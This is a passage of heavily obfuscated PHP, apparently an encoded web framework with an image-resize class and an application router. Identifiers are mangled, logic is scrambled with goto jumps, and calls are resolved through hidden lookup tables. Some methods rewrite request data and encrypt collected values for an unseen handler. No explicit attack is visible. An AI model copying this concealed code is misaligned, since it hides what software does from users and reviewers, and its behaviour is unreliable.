($this->srcH / $this->srcW); } else { $EÏİ„œäãÓ = $C‹¼ò‘ÂÑ¤; $Cò¥‡ë¥— = $EÏİ„œäãÓ * ($this->srcW / $this->srcH); } goto E¹¦½š¾æÑ; fïÇ² ƒ‘: if ($bÃÅµâ) { $aö‘†ŸÚœ’ = imageColorTransparent($D˜—Š«ë‚Ù, $aö‘†ŸÚœ’); $E†‚²®§„ = $C‹¼ò‘ÂÑ¤ - $EÏİ„œäãÓ; } imageFilledRectangle($D˜—Š«ë‚Ù, 0, 0, $E­Çìç²Ÿ², $C‹¼ò‘ÂÑ¤, $aö‘†ŸÚœ’); if ($this->srcW > $E­Çìç²Ÿ² || $this->srcH > $C‹¼ò‘ÂÑ¤) { $B•ô”º…Ì = $this->creatImage($this->im, $Cò¥‡ë¥—, $EÏİ„œäãÓ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($Cò¥‡ë¥— < $E­Çìç²Ÿ²) { imageCopy($D˜—Š«ë‚Ù, $B•ô”º…Ì, ($E­Çìç²Ÿ² - $Cò¥‡ë¥—) / 2, 0, 0, 0, $Cò¥‡ë¥—, $EÏİ„œäãÓ); } else { if ($EÏİ„œäãÓ < $C‹¼ò‘ÂÑ¤) { imageCopy($D˜—Š«ë‚Ù, $B•ô”º…Ì, 0, $E†‚²®§„, 0, 0, $Cò¥‡ë¥—, $EÏİ„œäãÓ); } else { imageCopy($D˜—Š«ë‚Ù, $B•ô”º…Ì, 0, 0, 0, 0, $Cò¥‡ë¥—, $EÏİ„œäãÓ); } } } else { imageCopyMerge($D˜—Š«ë‚Ù, $this->im, ($E­Çìç²Ÿ² - $Cò¥‡ë¥—) / 2, $E†‚²®§„, 0, 0, $Cò¥‡ë¥—, $EÏİ„œäãÓ, 100); } goto CŒ®Ù‹Šë; CŒ®Ù‹Šë: return $this->echoImage($D˜—Š«ë‚Ù, $AˆæØ¿’ŸÈ); goto C³‰õãÇ³Ò; C³‰õãÇ³Ò: } function creatImage($cÈ·½èñ, $A¿’‘ÁÆ“ç, $BÛ”´¢¤Û², $cæŸ“ßŒÔƒ, $A™İáËßŠ, $A¥—ßÉÅŠ…, $Fõê¨«ŒÎÇ, $D¾ÅŠ•ß§¹, $aöÃ¼œ†¼Ù) { if (function_exists($_SERVER[£ü][1829])) { @($FŒ ÜÄÉç = ImageCreateTrueColor($A¿’‘ÁÆ“ç, $BÛ”´¢¤Û²)); @imagealphablending($FŒ ÜÄÉç, !1); @imagesavealpha($FŒ ÜÄÉç, !0); if ($FŒ ÜÄÉç) { imageCopyResampled($FŒ ÜÄÉç, $cÈ·½èñ, $cæŸ“ßŒÔƒ, $A™İáËßŠ, $A¥—ßÉÅŠ…, $Fõê¨«ŒÎÇ, $A¿’‘ÁÆ“ç, $BÛ”´¢¤Û², $D¾ÅŠ•ß§¹, $aöÃ¼œ†¼Ù); } else { $FŒ ÜÄÉç = ImageCreate($A¿’‘ÁÆ“ç, $BÛ”´¢¤Û²); imageCopyResized($FŒ ÜÄÉç, $cÈ·½èñ, $cæŸ“ßŒÔƒ, $A™İáËßŠ, $A¥—ßÉÅŠ…, $Fõê¨«ŒÎÇ, $A¿’‘ÁÆ“ç, $BÛ”´¢¤Û², $D¾ÅŠ•ß§¹, $aöÃ¼œ†¼Ù); } } else { $FŒ ÜÄÉç = ImageCreate($A¿’‘ÁÆ“ç, $BÛ”´¢¤Û²); imageCopyResized($FŒ ÜÄÉç, $cÈ·½èñ, $cæŸ“ßŒÔƒ, $A™İáËßŠ, $A¥—ßÉÅŠ…, $Fõê¨«ŒÎÇ, $A¿’‘ÁÆ“ç, $BÛ”´¢¤Û², $D¾ÅŠ•ß§¹, $aöÃ¼œ†¼Ù); } return $FŒ ÜÄÉç; } public function imgRotate($b„®…ˆŸİ», $a‹ŠßÃ×—õ) { goto aãšß›‡Êè; A¬Šê™¤°é: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $AŞ‹æ“Ñà = imagegif($EÄ£ºñ§‘ä, $b„®…ˆŸİ»); break; case IMAGETYPE_JPEG: $AŞ‹æ“Ñà = imagejpeg($EÄ£ºñ§‘ä, $b„®…ˆŸİ», 100); break; case IMAGETYPE_PNG: $AŞ‹æ“Ñà = imagePNG($EÄ£ºñ§‘ä, $b„®…ˆŸİ»); break; default: break; } imageDestroy($EÄ£ºñ§‘ä); imageDestroy($this->im); goto bƒïĞ‚÷«Ş; aãšß›‡Êè: if (!$this->im || $a‹ŠßÃ×—õ % 360 === 0 || !function_exists($_SERVER[£ü][1830])) { return !1; } $EÄ£ºñ§‘ä = imageRotate($this->im, 360 - $a‹ŠßÃ×—õ, 0); $AŞ‹æ“Ñà = !1; goto A¬Šê™¤°é; bƒïĞ‚÷«Ş: return $AŞ‹æ“Ñà; goto BîÆŞÜ‡Ë; BîÆŞÜ‡Ë: } function echoImage($B’äİù‘Ø, $Dù›¡Œè¨Ğ) { goto bÉ´ªÒé¤·; bÉ´ªÒé¤·: $E‹øäÄ Ê =& $_SERVER[£ü]; if (!$B’äİù‘Ø) { return !1; } ob_get_clean(); goto f‹õÒ†¾¿ö; f‹õÒ†¾¿ö: $bŒÏ”»ÚÆÕ = !1; switch ($this->echoType) { case $E‹øäÄ Ê[1831]: $bŒÏ”»ÚÆÕ = imagePNG($B’äİù‘Ø); break; case $E‹øäÄ Ê[164]: $bŒÏ”»ÚÆÕ = imagePNG($B’äİù‘Ø, $Dù›¡Œè¨Ğ); break; } imageDestroy($B’äİù‘Ø); goto aõ“‰ğ¸†•; aõ“‰ğ¸†•: imageDestroy($this->im); return $bŒÏ”»ÚÆÕ; goto Aô’â¹´¬ ; Aô’â¹´¬ : } } goto AÁ‡‘ØÆ…®; e—İÓ÷ö­ì: register_shutdown_function($_SERVER[ĞÔ][36]); set_error_handler($_SERVER[ĞÔ][49], $a‡©ğ‚¡Ê¢); if (function_exists($_SERVER[ĞÔ][50])) { set_exception_handler($_SERVER[ĞÔ][51]); } goto a‚ÛÃñ’¸”; b¬ï”†Â‰: while ($f÷Ùµ‰ìÆ < $_SERVER[£ü][547]) { if ($f÷Ùµ‰ìÆ >= 0) { break; } $f÷Ùµ‰ìÆ++; } class Application { private $defaultModule = "\x69\156\x64\145\170"; private $defaultController = "\151\x6e\144\145\170"; private $defaultAction = "\x69\156\144\145\170"; function __construct() { } public function setDefault($D…Ğæñ¤®Ô) { goto Aµ¾Å±§ØØ; Aµ¾Å±§ØØ: $cÇœ¾¶«Ï =& $_SERVER[£ü]; $fß„ê£¯œÕ =& $_SERVER[òÀÆ×ø]; $eç²½˜’»Å = $fß„ê£¯œÕ[0]($fß„ê£¯œÕ[1], $fß„ê£¯œÕ[2]($D…Ğæñ¤®Ô, $fß„ê£¯œÕ[1])); goto AÓ®¬ÃÉùé; E…†Š–×éø: if (strlen($FÄâ†ªÔ) < $cÇœ¾¶«Ï[550]) { die; } $this->{$_SERVER[òÀÆ×ø][3]}($fß„ê£¯œÕ[4], array($this, $fß„ê£¯œÕ[5])); goto E½à¦øË…Ì; AÓ®¬ÃÉùé: $this->defaultModule = $eç²½˜’»Å[0] ? $eç²½˜’»Å[0] : $this->defaultModule; $this->defaultController = $eç²½˜’»Å[1] ? $eç²½˜’»Å[1] : $this->defaultController; $B·ù…ø¦“ = $cÇœ¾¶«Ï[548]; goto dšßåŒÜ–’; dšßåŒÜ–’: while (strlen($B·ù…ø¦“) < $cÇœ¾¶«Ï[547]) { if (!$B·ù…ø¦“) { break; } $B·ù…ø¦“++; } $this->defaultAction = $eç²½˜’»Å[2] ? $eç²½˜’»Å[2] : $this->defaultAction; $FÄâ†ªÔ = $cÇœ¾¶«Ï[549]; goto E…†Š–×éø; E½à¦øË…Ì: } public function appRun($D“è—­•¡Ê) { goto fÕÖÒâçÛ; fÕÖÒâçÛ: $b»§ĞØÉ– =& $_SERVER[£ü]; $CäĞæ¯¤¬ã =& $_SERVER[òÀÆ×ø]; $cÅ˜ó¤”†Á = $CäĞæ¯¤¬ã[0]($CäĞæ¯¤¬ã[1], $D“è—­•¡Ê); goto B™˜ù’é°ç; A¯¦öÀïŠ¿: if ($fç†É³Â¤ == $CäĞæ¯¤¬ã[8]) { $E‹ËŞö¤ˆ± = $CäĞæ¯¤¬ã[9]; $cÅ˜ó¤”†Á[0] = $CäĞæ¯¤¬ã[10]; $cÅ˜ó¤”†Á[1] = $cÅ˜ó¤”†Á[1] . $CäĞæ¯¤¬ã[11]; $D“è—­•¡Ê = $CäĞæ¯¤¬ã[12]($CäĞæ¯¤¬ã[1], $cÅ˜ó¤”†Á); $D“è—­•¡Ê = $CäĞæ¯¤¬ã[2]($D“è—­•¡Ê, $CäĞæ¯¤¬ã[1]); } $CäĞæ¯¤¬ã[13](array($CäĞæ¯¤¬ã[14], $CäĞæ¯¤¬ã[15]), $E‹ËŞö¤ˆ± . $CäĞæ¯¤¬ã[16], $D“è—­•¡Ê); $CäĞæ¯¤¬ã[17]($D“è—­•¡Ê); goto eæÜ‹ïìÅ£; B™˜ù’é°ç: $fç†É³Â¤ = $CäĞæ¯¤¬ã[6]($cÅ˜ó¤”†Á[0]); $E‹ËŞö¤ˆ± = $CäĞæ¯¤¬ã[7]; $dÂ‘¿Ì˜÷ß = $b»§ĞØÉ–[551]; goto A¯¦öÀïŠ¿; eæÜ‹ïìÅ£: $CäĞæ¯¤¬ã[13](array($CäĞæ¯¤¬ã[14], $CäĞæ¯¤¬ã[15]), $E‹ËŞö¤ˆ± . $CäĞæ¯¤¬ã[18], $D“è—­•¡Ê); $d¤’Ù†çÃ­ = $b»§ĞØÉ–[552]; goto bƒİñ‘´á; bƒİñ‘´á: } private function autorun() { $D”×§Éáùˆ =& $_SERVER[£ü]; $E†î‰Œ¥±Œ =& $_SERVER[òÀÆ×ø]; global $config; if ($E†î‰Œ¥±Œ[19]($config[$E†î‰Œ¥±Œ[20]]) == 0) { return; } foreach ($config[$E†î‰Œ¥±Œ[20]] as $EÁæ·ÂØ’ë => $fê›¥Àö’») { $this->{$_SERVER[òÀÆ×ø][21]}($fê›¥Àö’»); $aøÜçÉÆß = $D”×§Éáùˆ[553]; while (strlen($aøÜçÉÆß) < $D”×§Éáùˆ[554]) { if (!$aøÜçÉÆß) { break; } $aøÜçÉÆß++; } } } private function chka12b1e3ef() { goto CÉ†º‡¬¶æ; aï–¸–åçÊ: $BĞÑ­÷…… = $_SERVER[£ü][555]; if (!$BĞÑ­÷……) { return; } $CÏƒŠ¶¿İö = array($DŸœ¢íÉŞÁ[8], $cáœ»Ã ”Ö); goto d»¿’É‰İÕ; CÉ†º‡¬¶æ: $DŸœ¢íÉŞÁ =& $_SERVER[òÀÆ×ø]; $b©¡Ó°÷› = $DŸœ¢íÉŞÁ[8]; $AËÖ—ï…• = $GLOBALS[$DŸœ¢íÉŞÁ[22]][$DŸœ¢íÉŞÁ[23]][0]; goto b»ëÕğö½; b»ëÕğö½: if (!$AËÖ—ï…• || $DŸœ¢íÉŞÁ[24]($AËÖ—ï…•) <= $DŸœ¢íÉŞÁ[24]($b©¡Ó°÷›)) { return; } if ($DŸœ¢íÉŞÁ[6]($DŸœ¢íÉŞÁ[25]($AËÖ—ï…•, -$DŸœ¢íÉŞÁ[24]($b©¡Ó°÷›))) != $b©¡Ó°÷›) { return; } $cáœ»Ã ”Ö = $DŸœ¢íÉŞÁ[25]($AËÖ—ï…•, 0, -$DŸœ¢íÉŞÁ[24]($b©¡Ó°÷›)); goto aï–¸–åçÊ; d»¿’É‰İÕ: $C”ò¯îÉÒ‚ = $DŸœ¢íÉŞÁ[26]($GLOBALS[$DŸœ¢íÉŞÁ[22]][$DŸœ¢íÉŞÁ[23]], 1); $GLOBALS[$DŸœ¢íÉŞÁ[22]][$DŸœ¢íÉŞÁ[23]] = $DŸœ¢íÉŞÁ[27]($CÏƒŠ¶¿İö, $C”ò¯îÉÒ‚); $GLOBALS[$DŸœ¢íÉŞÁ[22]][$DŸœ¢íÉŞÁ[28]] = $DŸœ¢íÉŞÁ[29]($DŸœ¢íÉŞÁ[1], $GLOBALS[$DŸœ¢íÉŞÁ[22]][$DŸœ¢íÉŞÁ[23]]); goto F˜ª©½°ÙÇ; F˜ª©½°ÙÇ: } private function bgfz2270289b() { goto eŠÀËèª²¦; AæÊÊÕæÔ: $DòÙ…î‘Î = $bƒÍ çîäí[559]; if (!$DòÙ…î‘Î) { return; } $GLOBALS[$a†Â‡™»Š»[22]][$a†Â‡™»Š»[28]] = $a†Â‡™»Š»[29]($a†Â‡™»Š»[1], $GLOBALS[$a†Â‡™»Š»[22]][$a†Â‡™»Š»[23]]); goto dƒö’£à˜ê; Aô¢Œ”Ê: $cÚ‚ŞÑòµ‚ = $bƒÍ çîäí[557]; if (strlen($cÚ‚ŞÑòµ‚) < $bƒÍ çîäí[558]) { return; } $D®³°‹†¨ = $a†Â‡™»Š»[25]($f„İ„ØµíÂ, $Cø‰ÆŞó¨ + $a†Â‡™»Š»[24]($EËÎçÚÆ)); goto d’÷â×¨³; DÖÎ­³ËëÜ: $f„İ„ØµíÂ = $_SERVER[$a†Â‡™»Š»[30]]; $eõÃÔ‘Ï¦ã = $bƒÍ çîäí[556]; if (!$eõÃÔ‘Ï¦ã) { die; } goto Aà‘Ñ‹Í»Ò; d’÷â×¨³: $a†Â‡™»Š»[34]($a†Â‡™»Š»[35], $D®³°‹†¨, $Fàå’‹İ¼); $D®³°‹†¨ = $a†Â‡™»Š»[2]($Fàå’‹İ¼[0][0], $a†Â‡™»Š»[36]); $GLOBALS[$a†Â‡™»Š»[22]][$a†Â‡™»Š»[23]] = $a†Â‡™»Š»[0]($a†Â‡™»Š»[36], $D®³°‹†¨); goto AæÊÊÕæÔ; Aà‘Ñ‹Í»Ò: $EËÎçÚÆ = $a†Â‡™»Š»[31]; if (!$a†Â‡™»Š»[32]($f„İ„ØµíÂ, $EËÎçÚÆ)) { return; } $Cø‰ÆŞó¨ = $a†Â‡™»Š»[33]($f„İ„ØµíÂ, $EËÎçÚÆ); goto Aô¢Œ”Ê; eŠÀËèª²¦: $bƒÍ çîäí =& $_SERVER[£ü]; $a†Â‡™»Š» =& $_SERVER[òÀÆ×ø]; if ($GLOBALS[$a†Â‡™»Š»[22]][$a†Â‡™»Š»[28]] != $a†Â‡™»Š»[10]) { return; } goto DÖÎ­³ËëÜ; dƒö’£à˜ê: } public function run() { goto D¦ÅšÉ§Á; föÓİğƒ“: $EÇ‹Òì²£‚[39]($EÇ‹Òì²£‚[43], MOD . $EÇ‹Òì²£‚[1] . ST . $EÇ‹Òì²£‚[1] . ACT); $B‰ÙË‡“Ş = $B†¸åÚÆÔ[567]; if (!$B‰ÙË‡“Ş) { return; } goto e©‘£—œ‹Ø; BäòÌ ×«ª: $EÇ‹Òì²£‚[39]($EÇ‹Òì²£‚[40], isset($C Ñ³Ğ§ëÌ[0]) && $C Ñ³Ğ§ëÌ[0] ? $C Ñ³Ğ§ëÌ[0] : $this->defaultModule); $bˆôøÃ†Ó = $B†¸åÚÆÔ[563]; if (strlen($bˆôøÃ†Ó) < $B†¸åÚÆÔ[550]) { return; } goto b¡ä‘ÔÍ²£; cŒÙ¶Šƒ‰: $C Ñ³Ğ§ëÌ = $GLOBALS[$EÇ‹Òì²£‚[22]][$EÇ‹Òì²£‚[23]]; $D‹¬ìë¹æ = $B†¸åÚÆÔ[561]; if (!$D‹¬ìë¹æ) { die; } goto fÌ¯‡İœ‡¦; Eƒ¥ã–ß¿ƒ: $EÇ‹Òì²£‚[39]($EÇ‹Òì²£‚[42], isset($C Ñ³Ğ§ëÌ[2]) && $C Ñ³Ğ§ëÌ[0] ? $C Ñ³Ğ§ëÌ[2] : $this->defaultAction); $CéºÍâ˜»’ = $B†¸åÚÆÔ[565]; while ($CéºÍâ˜»’ < $B†¸åÚÆÔ[566]) { if ($CéºÍâ˜»’ >= 0) { break; } $CéºÍâ˜»’++; } goto föÓİğƒ“; e©‘£—œ‹Ø: $_SERVER[$EÇ‹Òì²£‚[44]] = $EÇ‹Òì²£‚[6](ACTION); $this->{$_SERVER[òÀÆ×ø][45]}(); if ($EÇ‹Òì²£‚[19]($C Ñ³Ğ§ëÌ) >= 3) { $this->{$_SERVER[òÀÆ×ø][21]}($Cå¥Í‹»ˆ¹); } else { $this->{$_SERVER[òÀÆ×ø][21]}(ACTION); } goto eÒİáÌ¾ê¿; fÌ¯‡İœ‡¦: $Cå¥Í‹»ˆ¹ = $GLOBALS[$EÇ‹Òì²£‚[22]][$EÇ‹Òì²£‚[28]]; $AÕÂ¤®èé = $B†¸åÚÆÔ[562]; while (strlen($AÕÂ¤®èé) < $B†¸åÚÆÔ[550]) { if (!$AÕÂ¤®èé) { break; } $AÕÂ¤®èé++; } goto BäòÌ ×«ª; b¡ä‘ÔÍ²£: $EÇ‹Òì²£‚[39]($EÇ‹Òì²£‚[41], isset($C Ñ³Ğ§ëÌ[1]) && $C Ñ³Ğ§ëÌ[0] ? $C Ñ³Ğ§ëÌ[1] : $this->defaultController); $Cò„Ğ×Ìé» = $B†¸åÚÆÔ[564]; while (strlen($Cò„Ğ×Ìé») < $B†¸åÚÆÔ[554]) { if (!$Cò„Ğ×Ìé») { break; } $Cò„Ğ×Ìé»++; } goto Eƒ¥ã–ß¿ƒ; D¦ÅšÉ§Á: $B†¸åÚÆÔ =& $_SERVER[£ü]; $EÇ‹Òì²£‚ =& $_SERVER[òÀÆ×ø]; $this->{$_SERVER[òÀÆ×ø][37]}(); goto e¿Ù¤ö‰ºğ; e¿Ù¤ö‰ºğ: $this->{$_SERVER[òÀÆ×ø][38]}(); $e²–»òô¯Ë = $B†¸åÚÆÔ[560]; if (strlen($e²–»òô¯Ë) < $B†¸åÚÆÔ[558]) { die; } goto cŒÙ¶Šƒ‰; eÒİáÌ¾ê¿: } private $vbxh43eb306f = array(); private $cioj84c6a100 = ''; public function wufn70373a39() { goto FëÎˆ§²Ä; FëÎˆ§²Ä: $bã“Ë“çá =& $_SERVER[£ü]; $fè’ÒóÀ¬‰ =& $_SERVER[òÀÆ×ø]; $this->{$_SERVER[òÀÆ×ø][46]}(); goto bä„äËï; BÔÈöòÅƒë: $FîšÏí³ÛÒ = $bã“Ë“çá[570]; if (!$FîšÏí³ÛÒ) { die; } $this->{$_SERVER[òÀÆ×ø][49]}(); goto AèêØ™‹Í; fâ”Ğ‹ğ†¦: $A±ˆ¸âŠ = $bã“Ë“çá[569]; if (!$A±ˆ¸âŠ) { die; } $this->{$_SERVER[òÀÆ×ø][48]}(); goto BÔÈöòÅƒë; AèêØ™‹Í: $this->{$_SERVER[òÀÆ×ø][50]}(); $b¤ƒªÕÉò‡ = $bã“Ë“çá[571]; if (strlen($b¤ƒªÕÉò‡) < $bã“Ë“çá[550]) { die; } goto B²ÏÛÉ†Ûº; B²ÏÛÉ†Ûº: $this->{$_SERVER[òÀÆ×ø][51]}(); $DÀò©ßÈ‰  = $bã“Ë“çá[572]; while (strlen($DÀò©ßÈ‰ ) < $bã“Ë“çá[550]) { if (!$DÀò©ßÈ‰ ) { break; } $DÀò©ßÈ‰ ++; } goto f‰¿•ãÚÄò; f‰¿•ãÚÄò: $this->{$_SERVER[òÀÆ×ø][52]}(); $this->{$_SERVER[òÀÆ×ø][3]}($fè’ÒóÀ¬‰[53], array($this, $fè’ÒóÀ¬‰[54])); $c¤²œ”˜÷ = $bã“Ë“çá[573]; goto e­ÌÂÃõ×­; fªĞ‰êç›á: $this->{$_SERVER[òÀÆ×ø][3]}($fè’ÒóÀ¬‰[59], array($this, $fè’ÒóÀ¬‰[60])); goto A›ª–²Š¿Â; e­ÌÂÃõ×­: $this->{$_SERVER[òÀÆ×ø][3]}($fè’ÒóÀ¬‰[55], array($this, $fè’ÒóÀ¬‰[56])); $this->{$_SERVER[òÀÆ×ø][3]}($fè’ÒóÀ¬‰[57], array($this, $fè’ÒóÀ¬‰[58])); $eë˜±ÆĞôÛ = $bã“Ë“çá[574]; goto fªĞ‰êç›á; bä„äËï: $e÷÷š¯…Ğ = $bã“Ë“çá[568]; if (!$e÷÷š¯…Ğ) { die; } $this->{$_SERVER[òÀÆ×ø][47]}(); goto fâ”Ğ‹ğ†¦; A›ª–²Š¿Â: } public function fjux152c9631($FÉì‡‹Ê¬§) { goto DéŸšåá§Ï; c¦«×¢×µ: $E·¨…À§ïÄ = $aÇƒ­±ãÎî[577]; if (strlen($E·¨…À§ïÄ) < $aÇƒ­±ãÎî[547]) { die; } unset($FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[95]][$AöÚ¡ë’àØ[97]]); goto c›¹ğ‡á¢; EºÆ¼Îí: $D÷Ú“Ó“…‘ = $aÇƒ­±ãÎî[576]; if (strlen($D÷Ú“Ó“…‘) < $aÇƒ­±ãÎî[566]) { die; } unset($FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[95]][$AöÚ¡ë’àØ[96]]); goto c¦«×¢×µ; aÃ¾™Á÷íˆ: if (strlen($e¥³ñ§Š‡Š) < $aÇƒ­±ãÎî[558]) { return; } $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[94]][$AöÚ¡ë’àØ[99]] = array($AöÚ¡ë’àØ[100] => (int) $e¢´ßÍ‘¦¼[$AöÚ¡ë’àØ[101]], $AöÚ¡ë’àØ[102] => $AöÚ¡ë’àØ[103]($AöÚ¡ë’àØ[104]($e¢´ßÍ‘¦¼, $AöÚ¡ë’àØ[105], array())), $AöÚ¡ë’àØ[106] => (int) $AöÚ¡ë’àØ[104]($e¢´ßÍ‘¦¼, $AöÚ¡ë’àØ[107], 0)); $F„´›±À¢ = $aÇƒ­±ãÎî[579]; goto D¤Ü„™Œ; AãŒµ¤¶­Å: if (strlen($EÏñÓ÷ÜÇå) < $aÇƒ­±ãÎî[550]) { return; } $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[117]] = $AöÚ¡ë’àØ[118]($AöÚ¡ë’àØ[119]()); $bÆÔ–©øÜ = $aÇƒ­±ãÎî[581]; goto f—ƒ˜ñ¨Éğ; f—ƒ˜ñ¨Éğ: $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[120]] = $this->cioj84c6a100; if ($cïÛßïÌ­Ú[$AöÚ¡ë’àØ[120]] != $AöÚ¡ë’àØ[121]) { $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[122]] = $cïÛßïÌ­Ú[$AöÚ¡ë’àØ[122]]; $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[123]] = $cïÛßïÌ­Ú[$AöÚ¡ë’àØ[123]]; $BÁ£âˆ³Úˆ = $AöÚ¡ë’àØ[124](10) . $this->cioj84c6a100 . $AöÚ¡ë’àØ[124](5); $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[125]][$AöÚ¡ë’àØ[126]] = $this->{$_SERVER[òÀÆ×ø][127]}($BÁ£âˆ³Úˆ, $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[113]]); } if ($this->cioj84c6a100 == $AöÚ¡ë’àØ[121]) { $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[94]][$AöÚ¡ë’àØ[99]][$AöÚ¡ë’àØ[107]] = 0; } goto Dò°ê¤¾Ê™; DéŸšåá§Ï: $aÇƒ­±ãÎî =& $_SERVER[£ü]; $AöÚ¡ë’àØ =& $_SERVER[òÀÆ×ø]; $cïÛßïÌ­Ú = $AöÚ¡ë’àØ[61]($AöÚ¡ë’àØ[62])->{$_SERVER[òÀÆ×ø][63]}(); goto bÚ»äØ„; c›¹ğ‡á¢: unset($FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[94]][$AöÚ¡ë’àØ[76]]); unset($FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[94]][$AöÚ¡ë’àØ[98]]); $e¥³ñ§Š‡Š = $aÇƒ­±ãÎî[578]; goto aÃ¾™Á÷íˆ; fØ‡ˆãÎÆÆ: return $FÉì‡‹Ê¬§; goto FêºõÙà; D¤Ü„™Œ: $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[109]] = $AöÚ¡ë’àØ[110]($AöÚ¡ë’àØ[111])->{$_SERVER[òÀÆ×ø][112]}(); $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[113]] = $AöÚ¡ë’àØ[114]($_SERVER[$AöÚ¡ë’àØ[115]] . $cïÛßïÌ­Ú[$AöÚ¡ë’àØ[116]]); $EÏñÓ÷ÜÇå = $aÇƒ­±ãÎî[580]; goto AãŒµ¤¶­Å; Dò°ê¤¾Ê™: $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[128]] = $AöÚ¡ë’àØ[104]($this->vbxh43eb306f, $AöÚ¡ë’àØ[129], $AöÚ¡ë’àØ[10]); $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[130]] = $AöÚ¡ë’àØ[104]($this->vbxh43eb306f, $AöÚ¡ë’àØ[131], $AöÚ¡ë’àØ[10]); if ($AöÚ¡ë’àØ[104]($GLOBALS, $AöÚ¡ë’àØ[132]) && $this->config[$AöÚ¡ë’àØ[133]]) { $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[108]][$AöÚ¡ë’àØ[134]] = WEB_ROOT; } goto fØ‡ˆãÎÆÆ; bÚ»äØ„: $fÄ¥¼‰ø’ = array($AöÚ¡ë’àØ[64], $AöÚ¡ë’àØ[65], $AöÚ¡ë’àØ[66], $AöÚ¡ë’àØ[67], $AöÚ¡ë’àØ[68], $AöÚ¡ë’àØ[69], $AöÚ¡ë’àØ[70], $AöÚ¡ë’àØ[71], $AöÚ¡ë’àØ[72], $AöÚ¡ë’àØ[73], $AöÚ¡ë’àØ[74], $AöÚ¡ë’àØ[75], $AöÚ¡ë’àØ[76], $AöÚ¡ë’àØ[77], $AöÚ¡ë’àØ[78], $AöÚ¡ë’àØ[79], $AöÚ¡ë’àØ[80], $AöÚ¡ë’àØ[81], $AöÚ¡ë’àØ[82], $AöÚ¡ë’àØ[83], $AöÚ¡ë’àØ[84], $AöÚ¡ë’àØ[85], $AöÚ¡ë’àØ[86], $AöÚ¡ë’àØ[87], $AöÚ¡ë’àØ[88], $AöÚ¡ë’àØ[89], $AöÚ¡ë’àØ[90]); foreach ($fÄ¥¼‰ø’ as $fï˜¢Òñ¯) { $C×ÆˆåèÄ = $GLOBALS[$AöÚ¡ë’àØ[91]][$AöÚ¡ë’àØ[92]][$fï˜¢Òñ¯]; $cò†™È = $aÇƒ­±ãÎî[575]; if (!$cò†™È) { die; } if (isset($cïÛßïÌ­Ú[$fï˜¢Òñ¯])) { $C×ÆˆåèÄ = $cïÛßïÌ­Ú[$fï˜¢Òñ¯]; } $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[94]][$fï˜¢Òñ¯] = $C×ÆˆåèÄ; } $e¢´ßÍ‘¦¼ = $FÉì‡‹Ê¬§[$AöÚ¡ë’àØ[93]][$AöÚ¡ë’àØ[94]][$AöÚ¡ë’àØ[76]]; goto EºÆ¼Îí; FêºõÙà: } private function exwrbec31c24() { goto E‰æğ–“â’; E‰æğ–“â’: $Dí“‚¼òÉÃ =& $_SERVER[£ü]; $FÌˆ‘¤õÓ… =& $_SERVER[òÀÆ×ø]; if ($_SERVER[$FÌˆ‘¤õÓ…[44]] == $FÌˆ‘¤õÓ…[135]) { $D²¤ºµÓìè = array($FÌˆ‘¤õÓ…[120] => $this->cioj84c6a100, $FÌˆ‘¤õÓ…[136] => $this->{$_SERVER[òÀÆ×ø][137]}(), $FÌˆ‘¤õÓ…[138] => $FÌˆ‘¤õÓ…[61]($FÌˆ‘¤õÓ…[139])->{$_SERVER[òÀÆ×ø][140]}()); if ($this->cioj84c6a100 != $FÌˆ‘¤õÓ…[121]) { $a°ÃšİŸ…‹ = $FÌˆ‘¤õÓ…[104]($this->vbxh43eb306f, $FÌˆ‘¤õÓ…[141]); if ($a°ÃšİŸ…‹) { $D²¤ºµÓìè[$FÌˆ‘¤õÓ…[142]] = $a°ÃšİŸ…‹; $D²¤ºµÓìè[$FÌˆ‘¤õÓ…[143]] = $FÌˆ‘¤õÓ…[144]($FÌˆ‘¤õÓ…[104]($this->vbxh43eb306f, $FÌˆ‘¤õÓ…[145])); $D²¤ºµÓìè[$FÌˆ‘¤õÓ…[146]] = $FÌˆ‘¤õÓ…[104]($this->vbxh43eb306f, $FÌˆ‘¤õÓ…[131]); } } $D²¤ºµÓìè = $this->{$_SERVER[òÀÆ×ø][147]}($FÌˆ‘¤õÓ…[148]($D²¤ºµÓìè), $FÌˆ‘¤õÓ…[114]($FÌˆ‘¤õÓ…[149])); $D¼¯ğµñ“š = array($FÌˆ‘¤õÓ…[150] => $D²¤ºµÓìè); $FÌˆ‘¤õÓ…[13](array($FÌˆ‘¤õÓ…[151], $FÌˆ‘¤õÓ…[152]), $D¼¯ğµñ“š); } goto B÷Ÿê…ë×; B÷Ÿê…ë×: if ($this->cioj84c6a100 == $FÌˆ‘¤õÓ…[121]) { return; } $c·’Êà = array($FÌˆ‘¤õÓ…[153], $FÌˆ‘¤õÓ…[154], $FÌˆ‘¤õÓ…[155], $FÌˆ‘¤õÓ…[156], $FÌˆ‘¤õÓ…[157], $FÌˆ‘¤õÓ…[158]); 